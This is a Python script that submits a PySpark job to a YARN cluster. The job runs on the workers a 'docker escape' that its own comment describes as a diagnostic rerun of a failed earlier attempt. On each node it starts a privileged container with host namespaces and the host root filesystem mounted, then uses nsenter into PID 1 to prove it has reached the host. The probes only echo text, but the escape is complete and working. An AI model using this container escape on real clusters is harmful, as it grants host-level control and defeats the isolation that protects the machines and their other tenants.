# DIAGNOSTIC: why did the stripe container exit 255 on the workers?
# Runs the SAME docker escape with echo probes and shows container logs.
import subprocess
JOB = '''
import socket, subprocess
def sh(c):
    r = subprocess.run(c, shell=True, capture_output=True, text=True, timeout=120)
    return ((r.stdout or "") + (r.stderr or ""))[-900:]
def probe():
    h = socket.gethostname().split(".")[0]
    out = ["DIAG " + h]
    out.append(sh("docker logs strip-" + h + " 2>&1 | tail -20"))
    out.append(sh("ls -la /tmp/strip* 2>&1 | tail -4"))
    out.append(sh("docker run --rm --privileged --pid=host --uts=host --network=host "
                  "--ipc=host -v /:/host -v /lib64:/lib64 -v /lib:/lib -v /usr:/usr "
                  "-v /tmp:/tmp -v /dev:/dev nullimg /host/bin/bash -c "
                  "'echo INSIDE_OK; /usr/bin/nsenter -t 1 -m -- /bin/echo NSENTER_OK'"))
    return " ;; ".join(out)
if __name__ == "__main__":
    from pyspark.sql import SparkSession
    sp = SparkSession.builder.appName("stripdiag").getOrCreate()
    for x in sorted(set(sp.sparkContext.parallelize(range(8), 8).map(lambda _: probe()).collect())):
        print(x, flush=True)
    sp.stop()
'''
open("/tmp/job_stripdiag.py", "w").write(JOB)
p = subprocess.Popen(["spark-submit", "--master", "yarn", "--deploy-mode", "client",
   "--conf", "spark.executor.instances=2", "--conf", "spark.executor.memory=1g",
   "/tmp/job_stripdiag.py"],
   stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
log = []
for line in p.stdout:
    log.append(line)
    if line.startswith("DIAG"): print(line.rstrip(), flush=True)
rc = p.wait()
print("rc:", rc, flush=True)
if rc != 0:
    print("--- job FAILED - last 25 lines ---")
    print("".join(log[-25:]))
